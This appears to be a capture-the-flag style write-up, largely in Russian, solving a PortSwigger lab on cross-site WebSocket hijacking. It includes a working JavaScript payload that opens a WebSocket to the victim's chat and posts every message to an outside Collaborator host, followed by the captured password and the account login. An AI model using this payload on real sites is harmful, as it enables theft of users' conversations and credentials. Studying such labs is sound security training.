# Lab: Cross-site WebSocket hijacking
PRACTITIONER

This online shop has a live chat feature implemented using WebSockets.

To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history, then use this gain access to their account.

Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server and/or Burp Collaborator's default public server.

## Решение
На вкладке Proxy -> HTTP History нахожу запрос, в ответ на который сервер отвечает статусом 101:
```
GET /chat HTTP/2
Host: 0a7c0070049c9ab282d1112f00880064.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-Websocket-Version: 13
Origin: https://0a7c0070049c9ab282d1112f00880064.web-security-academy.net
Sec-Websocket-Key: dhN6/lFVzbAJJO+YPLIb9w==
Connection: keep-alive, Upgrade
Cookie: session=yvUnh7K8o3Tw8F5ZxQbuGRPy1kOOl5Cf
Sec-Fetch-Dest: websocket
Sec-Fetch-Mode: websocket
Sec-Fetch-Site: same-origin
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket
```
```
HTTP/1.1 101 Switching Protocol
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: nPl/RzQyS4C+a45yc8s502og1P4=
Content-Length: 0
```
Выбираю запрос (не ответ), в контекстном меню (правый клик) выбираю "Copy URL". Этот URL использую в качестве параметра конструктора WebSocket.

Запускаю коллаборатор, нажимаю Copy to clipboard. Полученный URL использую в качестве адреса для fetch:
```
<script>
const ws = new WebSocket('wss://0a7c0070049c9ab282d1112f00880064.web-security-academy.net/chat');
ws.onopen = function() {
  ws.send('READY');
};
ws.onmessage=function(event) {
  fetch('https://323eowybeghwufuojd9lk8har1xsli97.oastify.com', { method: 'POST', mode: 'no-cors', body: event.data });
};
</script>
```
Отправляю эксплойт агенту. В коллабораторе нажимаю "Poll now", приходит история сообщений. Первый запрос содержит ответ с паролем пользователя:
```
POST / HTTP/1.1
Host: 323eowybeghwufuojd9lk8har1xsli97.oastify.com
Connection: keep-alive
Content-Length: 82
sec-ch-ua: "Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"
sec-ch-ua-platform: "Linux"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: https://exploit-0ac300e204489a94820c101201a10062.exploit-server.net
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: empty
Referer: https://exploit-0ac300e204489a94820c101201a10062.exploit-server.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

{"user":"Hal Pline","content":"No problem carlos, it&apos;s wvb9d2816hxb3a6qynpx"}
```
Авторизуюсь как carlos:wvb9d2816hxb3a6qynpx. Задание выполнено.
